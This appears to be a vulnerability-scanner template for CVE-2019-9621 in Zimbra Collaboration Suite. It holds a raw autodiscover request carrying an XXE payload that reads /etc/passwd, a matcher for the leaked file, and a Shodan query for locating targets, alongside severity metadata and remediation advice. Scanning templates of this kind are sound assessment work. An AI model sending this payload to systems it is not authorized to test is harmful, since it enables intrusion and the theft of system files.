http:
- matchers:
  - condition: and
    dsl:
    - regex('root:.*:0:0:', body)
    - contains(body, "response schema")
    - contains(header, "text/html")
    type: dsl
  raw:
  - "POST /autodiscover HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/xml\n\
    \n<?xml version=\"1.0\"?>\n<!DOCTYPE soap [\n<!ELEMENT soap ANY >\n<!ENTITY xxe\
    \ SYSTEM \"file:///etc/passwd\" >]>\n<Autodiscover>\n  <Request>\n    <EMailAddress>test@example.com</EMailAddress>\n\
    \    <AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>\n  </Request>\n\
    </Autodiscover>\n"
id: CVE-2019-9621
info:
  author: riteshs4hu
  classification:
    cpe: cpe:2.3:a:zimbra:collaboration_server:*:*:*:*:*:*:*:*
    cve-id: CVE-2019-9621
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-918
    epss-percentile: 0.99906
    epss-score: 0.94119
  description: 'Zimbra Collaboration Suite before 8.6 patch 13, 8.7.x before 8.7.11
    patch 10, and 8.8.x before 8.8.10 patch 7 or 8.8.x before 8.8.11 patch 3 allows
    SSRF via the ProxyServlet component.

    '
  impact: 'Attackers can perform SSRF, potentially leading to internal network access
    or further exploitation.

    '
  metadata:
    max-request: 1
    product: collaboration_server
    shodan-query: html:"Zimbra Collaboration Suite Web Client"
    vendor: zimbra
    verified: true
  name: Zimbra Collaboration Suite - SSRF
  reference:
  - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/zimbra_xxe_rce.rb
  - https://nvd.nist.gov/vuln/detail/cve-2019-9621
  - http://packetstormsecurity.com/files/153190/Zimbra-XML-Injection-Server-Side-Request-Forgery.html
  - https://blog.tint0.com/2019/03/a-saga-of-code-executions-on-zimbra.html
  - https://bugzilla.zimbra.com/show_bug.cgi?id=109127
  remediation: 'Update to the latest patched versions: 8.6 patch 13, 8.7.11 patch
    10, 8.8.10 patch 7, or 8.8.11 patch 3 or later.

    '
  severity: high
  tags: cve,cve2019,zimbra,collaboration-server,oast,oob,xxe,kev,vkev,vuln
